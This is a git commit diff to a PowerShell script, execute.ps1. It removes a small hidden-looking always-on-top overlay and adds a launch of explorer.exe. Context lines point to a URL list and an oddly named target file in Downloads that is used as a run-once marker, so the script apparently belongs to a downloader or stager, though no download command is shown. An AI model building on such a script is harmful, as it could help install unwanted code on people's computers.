f9d4d38715ef2c9d7d35121949e86e9bdac912dc
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-10 23:04:53 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -7,32 +7,7 @@ $urls = @(
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
 
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$form = New-Object System.Windows.Forms.Form
-$form.StartPosition = 'Manual' 
-$form.FormBorderStyle = 'None'
-$form.BackColor = [System.Drawing.Color]::Lime
-$form.TransparencyKey = $form.BackColor
-$form.TopMost = $true
-$form.Width = 50
-$form.Height = 50 
-$label = New-Object System.Windows.Forms.Label
-$label.Text = "H"
-$label.ForeColor = [System.Drawing.Color]::Green
-$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
-$label.AutoSize = $true
-$label.BackColor = [System.Drawing.Color]::Transparent
-$form.Controls.Add($label)
-$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
-$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
-$formLocationX = [int]$screenWidth - [int]$form.Width
-$formLocationY = [int]$screenHeight - [int]$form.Height
-$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
-$form.Add_MouseDown({
-    $form.Capture = $false
-})
-$form.Show()
+Start-Process "explorer.exe"
 
 if (Test-Path -Path $filePath) {
     exit
